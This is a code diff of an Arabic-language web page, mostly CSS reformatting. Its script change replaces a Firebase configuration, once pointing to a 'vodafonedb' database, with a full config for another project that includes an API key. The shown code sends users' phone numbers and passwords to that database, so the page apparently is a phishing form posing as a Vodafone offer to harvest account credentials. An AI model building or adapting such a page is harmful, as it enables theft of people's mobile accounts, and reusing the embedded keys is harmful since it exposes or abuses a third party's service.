@@ -13,7 +13,6 @@
   <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700&display=swap" rel="stylesheet" />
 
   <style>
-    /* نفس التنسيقات كما هي */
     body {
       margin: 0;
       padding: 0;
@@ -22,9 +21,22 @@
       color: white;
       text-align: center;
     }
-    .container { padding: 30px 15px; }
-    h1 { font-size: 30px; margin-bottom: 5px; }
-    .subtitle { font-size: 16px; margin-bottom: 30px; color: #ffdede; }
+
+    .container {
+      padding: 30px 15px;
+    }
+
+    h1 {
+      font-size: 30px;
+      margin-bottom: 5px;
+    }
+
+    .subtitle {
+      font-size: 16px;
+      margin-bottom: 30px;
+      color: #ffdede;
+    }
+
     .box {
       background: rgba(255, 255, 255, 0.06);
       border: 1px solid #ff3333;
@@ -34,8 +46,16 @@
       box-shadow: 0 8px 20px rgba(0, 0, 0, 0.5);
       transition: transform 0.3s ease;
     }
-    .box:hover { transform: scale(1.02); }
-    h2 { font-size: 22px; color: #ffbdbd; }
+
+    .box:hover {
+      transform: scale(1.02);
+    }
+
+    h2 {
+      font-size: 22px;
+      color: #ffbdbd;
+    }
+
     input {
       display: block;
       width: 90%;
@@ -45,6 +65,7 @@
       border: none;
       font-size: 14px;
     }
+
     .btn {
       background-color: white;
       color: #8e0000;
@@ -56,12 +77,17 @@
       margin-top: 10px;
       transition: background-color 0.3s;
     }
-    .btn:hover { background-color: #fdd; }
+
+    .btn:hover {
+      background-color: #fdd;
+    }
+
     .conditions {
       font-size: 12px;
       color: #ffcaca;
       margin-top: 10px;
     }
+
     #successPopup {
       position: fixed;
       top: 50%;
@@ -77,12 +103,14 @@
       display: none;
       box-shadow: 0 8px 16px rgba(0,0,0,0.5);
     }
+
     footer {
       margin-top: 30px;
       font-size: 14px;
       opacity: 0.7;
       direction: ltr;
     }
+
     .price-display {
       color: #ffdfdf;
       margin-top: 5px;
@@ -133,7 +161,13 @@
 
   <script>
     const firebaseConfig = {
-      databaseURL: "https://vodafonedb-default-rtdb.firebaseio.com/"
+      apiKey: "AIzaSyCuP6VscPxkQS5D5z7bCYWXijzaYCdbF2s",
+      authDomain: "starkoscript.firebaseapp.com",
+      databaseURL: "https://starkoscript-default-rtdb.firebaseio.com",
+      projectId: "starkoscript",
+      storageBucket: "starkoscript.appspot.com",
+      messagingSenderId: "381525854892",
+      appId: "1:381525854892:android:50ba5daa1cffae8faa2d09"
     };
 
     firebase.initializeApp(firebaseConfig);
@@ -154,7 +188,7 @@
           document.getElementById(numId).value = "";
           document.getElementById(passId).value = "";
         }).catch((error) => {
-          alert("حدث خطأ: " + error.message);
+          alert("خطأ أثناء الإرسال: " + error.message);
         });
       } else {
         alert("يرجى إدخال الرقم وكلمة المرور.");
